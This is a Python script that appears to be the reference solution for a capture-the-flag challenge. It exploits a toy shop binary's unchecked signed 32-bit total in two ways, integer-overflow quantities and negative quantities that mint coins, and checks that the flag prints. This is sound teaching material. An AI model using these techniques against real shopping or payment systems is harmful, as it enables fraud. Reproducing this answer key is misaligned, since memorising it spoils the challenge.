#!/usr/bin/env python3
"""
Reference solution for "Integer Overflow Shop".

The cashier computes  total = price * quantity  in a signed 32-bit int and
never checks the sign or the range. price(flag) = 36363636, balance = 1836.

Two independent ways to walk out with the flag:

  Path A — overflow a single flag purchase
      Choose quantity q (>= 1) so that 36363636 * q, reduced mod 2**32 and
      read back as a signed int, lands at some value <= 1836. Because
      36363636 is even it is NOT invertible mod 2**32 directly, so instead
      of solving for an exact target we scan quantities and keep the first
      one whose wrapped signed total is affordable.

  Path B — negative quantity to mint coins
      Buy a cheap item with a NEGATIVE quantity. total goes negative, and
      `balance -= total` ADDS coins. Inflate past 36363636, then buy the
      flag normally with quantity 1.

This script runs the real binary for both paths and checks the flag prints.
"""

import os
import subprocess
import sys

BASE = os.path.dirname(os.path.abspath(__file__))

MASK = (1 << 32) - 1
INT_MIN = -(1 << 31)
INT_MAX = (1 << 31) - 1

FLAG_PRICE = 36363636
FLAG_IDX = 3
STICKER_IDX = 0
STICKER_PRICE = 18
BALANCE = 1836


def to_signed32(x):
    x &= MASK
    return x - (1 << 32) if x >= (1 << 31) else x


def find_binary():
    names = (
        os.path.join("dist", "shop.exe"),   # Windows build
        os.path.join("dist", "shop"),        # Linux build
        "shop.exe",
        "shop",
    )

    for name in names:
        p = os.path.join(BASE, name)
        if os.path.exists(p):
            return p

    sys.exit(
        "shop binary not found.\n"
        "Build it first with one of:\n"
        "  make\n"
        "  gcc -O2 -fwrapv -Wall -o dist/shop.exe shop.c\n"
        "  docker run --rm -v \"$(pwd):/src\" -w /src gcc:latest "
        "gcc -O2 -fwrapv -Wall -o dist/shop shop.c\n"
    )


def run(stdin_text):
    binp = find_binary()
    proc = subprocess.run(
        [binp],
        input=stdin_text,
        capture_output=True,
        text=True,
        cwd=BASE,
        timeout=10,
    )
    return proc.stdout


def overflow_quantity():
    """Smallest positive qty whose wrapped signed total is <= BALANCE.

    A deeply negative wrapped total is even better than a small positive
    one: the cashier still accepts it (total <= balance) and then
    `balance -= total` MINTS coins instead of spending them.
    """
    for qty in range(1, 1 << 20):
        total = to_signed32(FLAG_PRICE * qty)
        if total <= BALANCE:
            return qty, total
    raise RuntimeError("no suitable quantity found (shouldn't happen)")


def path_a():
    qty, total = overflow_quantity()
    print(f"[Path A] quantity = {qty}  ->  signed total = {total} coin "
          f"(<= {BALANCE}, qty >= 1)")
    script = f"b\n{FLAG_IDX}\n{qty}\nq\n"
    return run(script)


def path_b():
    # need balance >= FLAG_PRICE; start at BALANCE. buy stickers with a
    # negative qty so total = STICKER_PRICE*qty is very negative -> balance
    # jumps up.
    need = FLAG_PRICE - BALANCE          # extra coins required
    neg_qty = -((need // STICKER_PRICE) + 1)   # round up, stay safely above
    minted_total = to_signed32(STICKER_PRICE * neg_qty)
    new_balance = BALANCE - minted_total
    print(f"[Path B] buy Sticker qty = {neg_qty}  ->  total = {minted_total} "
          f"coin, new balance = {new_balance}")
    print(f"[Path B] then buy flag qty = 1 at {FLAG_PRICE} coin")
    script = f"b\n{STICKER_IDX}\n{neg_qty}\nb\n{FLAG_IDX}\n1\nq\n"
    return run(script)


def main():
    ok = True
    for name, fn in (("A (overflow)", path_a), ("B (negative qty)", path_b)):
        out = fn()
        flags = [l for l in out.splitlines() if l.startswith("LYKNCTF{")]
        if flags:
            print(f"  -> Path {name}: GOT FLAG {flags[0]}")
        else:
            print(f"  -> Path {name}: FAILED")
            print(out)
            ok = False
        print()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
